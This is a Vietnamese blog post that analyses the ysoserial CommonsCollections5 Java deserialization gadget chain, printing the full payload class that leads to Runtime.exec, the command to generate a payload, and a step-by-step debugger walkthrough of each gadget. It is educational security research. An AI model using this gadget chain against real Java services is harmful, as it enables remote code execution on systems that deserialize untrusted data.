---
date: 2026-04-10T00:00:00+07:00
title: Ysoserial Commons Collections 5 Analyst
categories: [pentesting, Web-Exploitation]
tags: [Web, ysoserial]
---

# Ysoserial Commons Collections 5 Analyst

### Tổng quan CommonsCollections 5 trong Ysoserial

`CommonsCollections` là một trong những gadget chain nổi tiếng nhất trong các cuộc tấn công khai thác `Java deserialization` không an toàn, đặc biệt khi ứng dụng sử dụng thư viện `Apache Commons Collections`.

Trong bài viết này, chúng ta sẽ tập trung vào `CommonsCollections5 (CC5)` — một trong các chain được tích hợp sẵn trong công cụ `ysoserial` . Mình chọn phân tích CC5 vì đây là chain được nhiều người đề xuất để học do tính minh bạch và dễ debug.

![image](https://hackmd.io/_uploads/BkTHHfY1bg.png)

### Thiết lập môi trường 

Mở dự án ysoserial trong IntelliJ IDEA (hoặc IDE tương đương). Yêu cầu:
- JDK 8
- Thư viện commons-collections:3.1

Mở Ysoserial project sau khi tải từ github link ở đây:

<https://github.com/frohoff/ysoserial>

Ở đây mình sử dụng `IntelliJ` để tiến hành test và debug.

![image](https://hackmd.io/_uploads/SyywUfKkbl.png)

Khi vừa mở lên thì ta có thể thấy được `GadgetChain` được giới thiệu sẵn ở đây và kèm với đó là điều kiện để có thể chạy được để nó gen ra payload ở đây ta sẽ dùng `JDK 8`.

![image](https://hackmd.io/_uploads/HJj2UzKkWx.png)

### Payload

```java 
package ysoserial.payloads;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
		        new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				new InvokerTransformer("exec",
					new Class[] { String.class }, execArgs),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
		valfield.set(val, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections5.class, args);
	}

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
```

Khi ta chạy được lệnh `java -jar ysoserial.jar CommonsCollections5 "calc.exe"` payload được tạo ra và khi victim deserializes nó, calc.exe sẽ được thực thi.

![image](https://hackmd.io/_uploads/H1Nh2MKJ-l.png)

![image](https://hackmd.io/_uploads/r1APazYkWe.png)


Vậy là ta chắc chắn rằng nó chạy được không vấn đề gì nên ta sẽ đi vào phân tích và debug gadget.

### Phân tích từng phần và Debug

Theo như comment thì ta có đống `gadget` như sau : 

```text 
Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

`ObjectInputStream.readObject()` thì không có gì để nói vì nó chỉ để thực hiện read object đã được serialize nên ta đi vào gadget luôn. Ta tới với gadget 1 --> 2 : 

```text 
Gadget 1:BadAttributeValueExpException.readObject() --> Gadget 2:TiedMapEntry.toString()
```

#### BadAttributeValueExpException.readObject() --> TiedMapEntry.toString()

Class `BadAttributeValueExpException` (package javax.management) được thiết kế để ném exception khi giá trị thuộc tính JMX không hợp lệ.
Tuy nhiên, phương thức `readObject()` của nó ghi đè phương thức mặc định và gọi `.toString()` trên trường val nếu:
- val != null
- val không phải là String

Và một số điều kiện về `SecurityManager` hoặc kiểu dữ liệu
Trong payload, ta gán `val = new TiedMapEntry(lazyMap, "foo")` → không phải String → .toString() được gọi.

Đây chính là điểm khởi phát của toàn bộ chuỗi! 

![image](https://hackmd.io/_uploads/H10sacFyZg.png)

![image](https://hackmd.io/_uploads/SJiBysK1Ze.png)

Điều kiện để `valObj` được gọi lần lượt là : 

- valObj `!= null`.
- valObj `không phải String`.
- HOẶC `System.getSecurityManager() == null`.
- HOẶC `valObj là primitive wrapper` (Long, Integer, etc.)

Bây giờ ta sẽ đặt breakpoint ngay tại đoạn `Object valObj = gf.get("val", null)` và `val = valObj.toString()` và tiến hành debug từng bước xem nó sẽ gọi tới đâu.

![image](https://hackmd.io/_uploads/rkCKesFk-g.png)

Có thể thấy rằng khi đặt breakpoint ở line 72 và thực thi thì `valObj` bây giờ là một object nằm bên trong `TiedMapEntry`.

![image](https://hackmd.io/_uploads/r1aBVjFJWe.png)

![image](https://hackmd.io/_uploads/BJydEst1Zx.png)

Sau đó sau khi đi từ breakpoint ở dòng 86 thì `valObj` được gọi đến bên `toString` của class `TiedMapEntry` .

![image](https://hackmd.io/_uploads/SkS-8oFybl.png)

#### TiedMapEntry() --> LazyMap.get()

Ta sẽ tiến hành tiếp tục phân tích gadget thứ 2 là từ `TiedMapEntry()` tới `LazyMap.get()`.

![image](https://hackmd.io/_uploads/rJ0YPjtyZx.png)

Ở class `TiedMapEntry.java` ta có thể thấy rằng nó call 2 giá trị đó là `getKey()` và `getValue()`.

Đầu tiên ta sẽ thử click rồi follow method `getKey()` xem thử nó có gì.

![image](https://hackmd.io/_uploads/BkcmPhFy-l.png)

![image](https://hackmd.io/_uploads/B1IEvnY1Zg.png)

Có vẻ không có gì nó chỉ là get key từ object key không có gì để phân tích nên ta sẽ follow method `getValue()`.

![image](https://hackmd.io/_uploads/BkEFDnFk-l.png)

Thấy được rằng `getValue()` có gọi đến map nên ta sẽ set một cái breakpoint nằm ở ngay đoạn `getValue()`.

![image](https://hackmd.io/_uploads/r1Mxd2ty-l.png)

Ồ ta thấy rằng nó gọi đến class `LazyMap` là một trong gadget của ta cần tới tiếp tục follow để xem nó có gọi đến `LazyMap.get` không.

![image](https://hackmd.io/_uploads/Bk-jd3FkZg.png)

Chuẩn theo gadget ta xác định được nó call đến `LazyMap.get` .

```java 
public Object get(Object key) {
    // Nếu map chưa có key này
    if (map.containsKey(key) == false) {
        // Tạo value bằng transformer
        Object value = factory.transform(key);
        // Lưu vào map
        map.put(key, value);
        return value;
    }
    // Nếu có rồi thì return bình thường
    return map.get(key);
}
```

![image](https://hackmd.io/_uploads/r1Nmt2tkbl.png)

Luồng xử lý nó đơn giản chỉ là : 
- getKey() → trả về "foo" (không có gì đặc biệt)
- getValue() → gọi map.get(key) → đây chính là LazyMap.get("foo")
- Vì "foo" chưa tồn tại trong LazyMap, phương thức get() sẽ:
- Gọi factory.transform("foo")
- Lưu kết quả vào map
- Trả về giá trị đó
→ factory ở đây là ChainedTransformer, nên transform() sẽ được gọi.

Đã nạp key vào `LazyMap` bây giờ ta đã đi đến cuối gadget 2 bây giờ đi tiếp gadget tiếp theo.

![image](https://hackmd.io/_uploads/SJcro3KJbe.png)

#### LazyMap.get() --> ChainedTransformer.transform()

Ta bay vào class `LazyMap` sau đó tìm được hàm `get` của nó sau đó tiến hành set thêm 1 cái breakpoint ở đây xem luồng xử lý nó sẽ như thế nào.

![image](https://hackmd.io/_uploads/r1hbiy9yWe.png)

![image](https://hackmd.io/_uploads/B1v7ok9J-l.png)

Rồi ở đây ta thấy nó đã chạy xuống dưới là hàm : 

```java 
Object value = factory.transform(key);
```

Ở đây giá trị key đã có và được gán là `foo` nên điều kiện đúng và nó chạy đúng theo gadget. Trong ysoserial, `factory` được set thành `ChainedTransformer` và ta thấy rằng ở đây rằng hàm `ChainedTransformer` đã được gọi lên để ghép vào phần gadget này.

#### ChainedTransformer.transform() --> Phần còn lại 

Như ở phần giới thiệu đã nói ngay sau `LazyMap.get()` là một chuỗi `transform` bao gồm : 

```text 
ChainedTransformer.transform()
 ConstantTransformer.transform()
  InvokerTransformer.transform()
   Method.invoke()
    Class.getMethod()
     InvokerTransformer.transform()
      Method.invoke()
       Runtime.getRuntime()
        InvokerTransformer.transform()
         Method.invoke()
          Runtime.exec()
```

Từ cái breakpoint trước ta tiếp tục chạy nó đưa ta vào hàm `public Object transform(Object object)`.

![image](https://hackmd.io/_uploads/SJuip1qJbe.png)

Ở đây ta có thể thấy trong method `transform` của chain này nó sẽ tiến hành loop hết các giá trị bên trong `i.Transformers` sau đó thực hiện gán nó vào Object và return về có thể coi rằng bước loop này chính là chain mọi cái transform lại với nhau.

![image](https://hackmd.io/_uploads/ry6cR1cJ-l.png)

`this.iTransformers[]` trong gadgetchain này được set cho các giá trị lần lượt là:
- ConstantTransformer
- InvokerTransformer
- InvokerTransformer
- InvokerTransformer
- ConstantTransformer

Bây giờ ta sẽ test từng vòng loop để xem nó làm những gì.

![image](https://hackmd.io/_uploads/S18Akl9kbl.png)

Ở đây với `i=0` thì nó được gán Object là `foo` ở đây nó dạng `this.iTransformers[0] = ConstantTransformer` nó gọi `ConstantTransformer(object)`.

![image](https://hackmd.io/_uploads/rkD7bg9Jbe.png)

ConstantTransformer sẽ có dạng như dưới đây :

![image](https://hackmd.io/_uploads/BkUHbx9y-g.png)

Ở đây ta sẽ thấy rằng giá trị của iConstant đã set giá trị của Object trở thành class `lang.java.Runtime`.

![image](https://hackmd.io/_uploads/B1ngzecy-x.png)

![image](https://hackmd.io/_uploads/Hk8MMe5k-e.png)

Tới với vòng lặp thứ 2 là `i=1` ta có : 

- this.iTransformer[1].transform(object) = InvokerTransformer.transform(object)

- object = class java.lang.Runtime()

- InvokerTransformer.transform()

![image](https://hackmd.io/_uploads/H1uZ5B91Ze.png)

Ở đây ta có các giá trị bao gồm : 

- Class cls : nó là class java.lang.Class.

![image](https://hackmd.io/_uploads/rkZQsS5Jbe.png)

- `this.iMethodName` = `cls.getMethod` nó đã được set ở trước. 

![image](https://hackmd.io/_uploads/Hkts9rqkbl.png)

- `this.iParamTypes = Class[] { String.class, Class[].class }` : cũng đã được set giá trị trước.

![image](https://hackmd.io/_uploads/rJmGor9Jbg.png)

- `Method method` = Class.getMethod().

![image](https://hackmd.io/_uploads/Byt9jr51Zg.png)

- `this.Args = new Object[]` { “getRuntime”, new Class[0] }.

![image](https://hackmd.io/_uploads/Bkf2jB5k-l.png)


Cuối cùng là nó thực hiện `return method.invoke(input, iArgs)` dưới đây là hình minh hoạ dễ hiểu cho method `InvokerTransformer`.

![image](https://hackmd.io/_uploads/ByiYar91-l.png)

- Ở đây ở dòng `Class cls = input.getClass();` có sự khác biệt khá lớn so với `method InvokerTransformer.transform()` thông thường vì method này thường sẽ input là một object nhưng ở đây nó lại là 1 class cụ thể là `class java.lang.Runtime` thật là ảo giác từ đó khi thực hiện `getClass` nó sẽ giống như gọi `Class.getClass()` rồi return nó lại `class Class`. 

- Sau đó đến dòng `Method method = cls.getMethod(iMethodName, iParamTypes);` thì nó cũng lú tương tự, ở đây nó sẽ dùng `Class.getMethod` và method này sẽ trả về `getMethod` của `class Class`.

- Và ở cuối sẽ là `method invoke` ta đã lấy ở bên trên ở đây nó sử dụng `Method.invoke(object, args)` nó là Reflection API ở đây nó sử dụng `Reflection API` này là để invoke một method của object khi nó không thể cast theo một kiểu đã được xác định trước. Ta có thể hiểu nôm na rằng ở đây ta có một `private class ABCXZY ` nào đó và một `public method foo()` nào đó từ nơi khác nhận được `object` của `class ABCXYZ`. Thì ở đây thường để `invoke` được method `ABCXYZ.foo()` này ta sẽ không thể gọi thẳng đến `object.foo()` mà ta phải cast nó sang dạng kiểu ((ABCXYZ)object).foo(). Nhưng cái dở hơi ở đây ta lại khai báo nó là `private class` thì sao mà đưa ra ngoài được thì method Reflection giải quyết cho ta vấn đề trên.

- `return method.invoke(input, this.iArgs);` cũng không có gì với vòng lặp thứ 2 này kết quả của invoke này là kết quả của đoạn trước tại đây object của nó là `class Runtime` ta có thể xem `input=Runtime.class` là 1 `object` của `class Class` sau đó kết quả của vòng lặp thứ 3 này nó là `method Runtime()` bây giờ ta đi đến vòng lặp thứ 4

Tới với vòng lặp thứ 4 tại đây giá trị `i = 3`.

![image](https://hackmd.io/_uploads/HyM9r8cJbl.png)

![image](https://hackmd.io/_uploads/HyaqSL5yWl.png)

Tại đây giá trị của `iMethodName` đã là `exec` cùng với đó là `iArgs` nay đã được gán giá trị là `calc.exe`.

![image](https://hackmd.io/_uploads/BkrT8I9yWg.png)

Debug đến đây nó sẽ thực thi invoke chạy hàm exec đến calc.exe tại đây máy tính đã được popup lên.

![image](https://hackmd.io/_uploads/Hk1ZvIc1bx.png)

Vậy là kết thúc phân tích CC5 của Ysoserial.

Nguồn tham khảo phân tích: https://sec.vnpt.vn/2020/02/the-art-of-deserialization-gadget-hunting-part-2




